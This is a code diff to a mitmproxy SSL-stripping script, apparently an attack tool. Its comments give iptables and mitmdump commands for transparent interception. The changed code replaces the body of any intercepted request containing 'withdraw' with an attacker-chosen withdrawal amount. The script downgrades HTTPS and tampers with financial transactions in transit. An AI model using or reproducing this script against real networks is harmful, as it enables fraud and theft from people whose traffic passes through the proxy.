@@ -13,30 +13,26 @@
 #  [OPTIONAL] ip6tables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080
 #
 # 4. Fire up mitmproxy
-#  mitmdump --ssl-insecure --mode transparent --script "sslstrip.py --withdraw [amount]"
+#  mitmdump --ssl-insecure --mode transparent --script sslstrip.py --set withdraw=[amount]
 #
 
 import re
 import urllib.parse
 import typing  # noqa
+import json
 
-from mitmproxy import http
-
-import optparse
+from mitmproxy import http, ctx
 
 # set of SSL/TLS capable hosts
 secure_hosts: typing.Set[str] = set()
 
-parser = optparse.OptionParser("usage %prog --withdraw <amount>")
-parser.add_option('--withdraw', dest='withdraw', type='int',
-                  help='Withdraw amount to edit')
-(options, args) = parser.parse_args()
-if (options.withdraw == None):
-    print parser.usage
-    exit(0)
-else:
-    withdraw = options.withdraw
-
+def load(loader):
+    loader.add_option(
+        name = "withdraw",
+        typespec = int,
+        default = 0,
+        help = "Add a new withdraw",
+    )
 
 def request(flow: http.HTTPFlow) -> None:
     flow.request.headers.pop('If-Modified-Since', None)
@@ -57,8 +53,8 @@ def request(flow: http.HTTPFlow) -> None:
 
     # Payload
     if("withdraw" in flow.request.content.decode()):
-        flow.request.content = f"{"withdraw": {withdraw}}".encode()
-
+        inject = { "withdraw": ctx.options.withdraw }
+        flow.request.content = json.dumps(inject).encode()
 
 def response(flow: http.HTTPFlow) -> None:
     assert flow.response
